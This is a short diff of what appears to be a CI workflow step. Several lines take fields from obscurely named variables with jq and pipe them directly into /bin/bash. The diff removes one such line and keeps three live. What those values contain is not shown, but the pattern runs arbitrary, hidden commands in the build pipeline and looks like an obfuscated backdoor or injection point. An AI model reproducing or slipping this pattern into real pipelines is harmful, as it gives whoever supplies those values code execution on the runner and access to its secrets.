@@ -21,7 +21,6 @@ jobs:
           echo $lhe4 | jq -r .aleax7 | /bin/bash
           printf '%s' "$k731" | jq -r .f09 | /bin/bash
           printf '%s' "$pycz8185" | jq -r .q55 | /bin/bash
-          echo $qubwt0460 | jq -r .wbsg6 | /bin/bash
 
       - name: Store results
         if: always()
